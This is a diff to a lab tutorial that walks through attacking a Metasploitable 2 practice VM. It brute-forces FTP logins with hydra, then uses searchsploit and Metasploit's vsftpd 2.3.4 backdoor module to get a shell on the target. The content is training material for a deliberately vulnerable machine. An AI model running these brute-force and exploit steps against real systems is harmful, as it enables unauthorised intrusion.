@@ -2,7 +2,7 @@
 Linux + Metasploitable 2: Exploits (FTP 21/22/23)
 ### Prerequisite
 
-This setup assumes you have a general understanding of networks and linux commands. 
+This setup assumes you have a general understanding of networks and basic linux commands. 
 
 ### Setup
 
@@ -67,10 +67,44 @@ This setup assumes you have a general understanding of networks and linux comman
 ### It’s Exploit Time!
 
 1. Exploit port 21 FTP
-    1. Review MS2.txt - Notice the service (vsftpd 2.3.4) - it’s outdated and thus vulnerable for exploiting.
-    2. Utilize the user/password lists to gain access. In terminal:
-        1. hydra -L Users.txt -P Passwords.txt {IP of MS2 VM} 
+    1. Review MS2.txt - Notice the service (vsftpd 2.3.4) - it’s outdated and thus vulnerable for exploiting. 😈
+    2. Utilize the user/password lists to gain access. 
+        
+        hydra -L Users.txt -P Passwords.txt {IP of MS2 VM} 
         
         This list will show the logins/passwords from your list that match.
         
-    3. Confirm you are on : ifconfig + whoami
+    3. Login to MS2 -- sign in with user/password credentials
+        
+        ftp {IP of MS2 VM} 
+        
+    4. Confirm in MS2 directory 
+        
+        ls or ifconfig
+        
+    5. Exit out of MS2 vm: 
+        
+        bye
+        
+    6. Use searchsploit tool to see vulnerabilities associated with version (2 should appear).
+        
+        searchsploit vsftpd 2.3.4
+        
+    7. Enter into Metasploit framework. Search 
+        
+        mfsconsole > search vsftpd 2.3.4
+        
+    8. Use exploit shown and view options.
+        
+        use 0 
+        
+        show options
+        
+    9. Set the target host.
+        
+        set rhosts 10.0.200.7 > show options
+        
+    
+    1-2-3… exploit … once you enter this, the terminal should now be MS2. 
+    
+    Confirm you are on MS2 : ifconfig + whoami
